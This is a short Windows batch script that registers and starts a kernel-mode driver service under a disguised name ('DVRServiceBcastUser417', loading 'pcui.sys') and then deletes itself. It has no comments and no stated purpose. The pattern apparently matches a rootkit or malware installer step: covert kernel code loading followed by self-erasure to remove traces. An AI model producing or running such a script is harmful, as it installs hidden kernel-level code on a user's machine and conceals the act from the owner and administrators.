@echo off
cd %~dp0
sc create DVRServiceBcastUser417 binpath=C:\Windows\System32\drivers\pcui.sys type=kernel
sc start DVRServiceBcastUser417
del "%~f0"



